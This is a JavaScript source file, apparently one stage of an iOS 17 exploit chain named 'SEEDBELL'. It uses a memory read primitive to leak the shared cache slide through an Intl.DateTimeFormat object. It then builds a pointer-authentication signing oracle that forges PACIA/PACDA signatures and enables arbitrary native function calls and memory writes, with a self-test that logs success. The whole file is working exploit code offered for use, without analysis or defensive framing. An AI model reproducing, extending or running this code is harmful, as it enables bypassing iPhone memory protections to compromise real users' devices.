import { createMachOEnvironment } from "./macho.js";
import { createSeedbellTargets } from "./targets.js";
import { createSeedbellCore } from "./core.js";
import { createNativeExecution } from "./native.js";

const IOS_17_OFFSETS = Object.freeze({
    generatedCodeSize: 112,
    tableEntryHeaderSize: 8,
    tableHeaderSize: 24,
    iteratorBacking: 16,
    segmenterState: 328,
    breakIterator: 472,
    textStorage: 512,
    nativeSegmenter: 520,
    backingScratchSlot: 664,
    breakIteratorTable: 8,
    tableCount: 0,
    tableStride: 4,
    tableMetadata: 12,
    tableFlags: 16,
    tableEntries: 20,
    entryBytes: 3,
    textPatch: 32,
    nativeSegmenterLimit: 48,
    callbackArgument: 16,
    stateLength: 44,
    generatedCodePointer: 56,
    generatedCodeCallback: 32
});

const stripPointerTag = (value) => value & 0x7fffffffffn;

function discoverSharedCache(reader, SharedCacheContext, log) {
    const formatter = new Intl.DateTimeFormat();
    const formatterAddress = reader.getObjectAddress(formatter);
    const first = reader.read64(formatterAddress + 0x18n);
    const second = stripPointerTag(reader.read64(first));
    const leakedImageAddress = stripPointerTag(reader.read64(second));
    log("[SEEDBELL] formatter=0x" + formatterAddress.toString(16));
    log("[SEEDBELL] formatter state=0x" + first.toString(16));
    log("[SEEDBELL] ICU state=0x" + second.toString(16));
    log("[SEEDBELL] leaked image=0x" + leakedImageAddress.toString(16));
    return SharedCacheContext.fromImageAddress(leakedImageAddress);
}

export function createSeedbell17(reader, log = () => {}) {
    const macho = createMachOEnvironment(reader);
    log("[SEEDBELL] discovering shared cache");
    const context = discoverSharedCache(reader, macho.SharedCacheContext, log);
    log("[SEEDBELL] shared cache discovered");
    const targets = createSeedbellTargets({
        reader,
        context,
        MachOImage: macho.MachOImage,
        log
    });
    context.targets = targets;

    const core = createSeedbellCore({
        reader,
        context,
        targets,
        offsets: IOS_17_OFFSETS
    });
    log("[SEEDBELL] constructing PAC oracle");
    const pacEngine = new core.PacEngine();
    log("[SEEDBELL] PAC oracle constructed");
    const native = createNativeExecution({
        reader,
        offsets: IOS_17_OFFSETS,
        targets,
        pacEngine,
        log
    });
    log("[SEEDBELL] native call constructed");

    return {
        sharedCacheSlide: context.slide,
        targets,
        context,
        pacia(value, modifier) {
            return pacEngine.pacia(BigInt(value), BigInt(modifier));
        },
        pacda(value, modifier) {
            return pacEngine.pacda(BigInt(value), BigInt(modifier));
        },
        autia(value, modifier) {
            return pacEngine.autia(BigInt(value), BigInt(modifier));
        },
        autda(value, modifier) {
            return pacEngine.autda(BigInt(value), BigInt(modifier));
        },
        call(target, args = []) {
            return native.nativeCall.call(BigInt(target), args.map(BigInt));
        },
        callSigned(signedTarget, args = []) {
            return native.nativeCall.callSigned(BigInt(signedTarget), args.map(BigInt));
        },
        memory: native.memory
    };
}

export function verifySeedbell17(reader, seedbell, log = console.log) {
    const instructionValue = 0x12345678n;
    const instructionModifier = 0x24adn;
    const dataValue = 0x13371337n;
    const dataModifier = 0x4242n;

    log("[VERIFY] PACIA");
    const signedInstruction = seedbell.pacia(instructionValue, instructionModifier);
    log("[VERIFY] PACIA signed=0x" + signedInstruction.toString(16));
    log("[VERIFY] AUTIA");
    const authenticatedInstruction = seedbell.autia(signedInstruction, instructionModifier);
    log("[VERIFY] PACDA");
    const signedData = seedbell.pacda(dataValue, dataModifier);
    log("[VERIFY] PACDA signed=0x" + signedData.toString(16));
    log("[VERIFY] AUTDA");
    const authenticatedData = seedbell.autda(signedData, dataModifier);

    if (stripPointerTag(authenticatedInstruction) !== instructionValue) {
        throw new Error("PACIA/AUTIA round trip failed");
    }
    if (stripPointerTag(authenticatedData) !== dataValue) {
        throw new Error("PACDA/AUTDA round trip failed");
    }

    log("[VERIFY] malloc");
    const allocation = seedbell.memory.malloc(0x40n);
    try {
        log("[VERIFY] memset");
        seedbell.memory.memset(allocation, 0x41n, 0x40n);
        const readback = reader.read32(allocation);
        if (readback !== 0x41414141) throw new Error("Native memset readback failed");
        log("[SEEDBELL] shared-cache slide=0x" + seedbell.sharedCacheSlide.toString(16));
        log("[SEEDBELL] PACIA signed=0x" + signedInstruction.toString(16));
        log("[SEEDBELL] PACDA signed=0x" + signedData.toString(16));
        log("[SEEDBELL] native allocation=0x" + allocation.toString(16));
        log("[SEEDBELL] native memset readback=0x" + readback.toString(16));
    } finally {
        seedbell.memory.free(allocation);
    }

    log("SEEDBELL17_STANDALONE_SUCCESS");
}
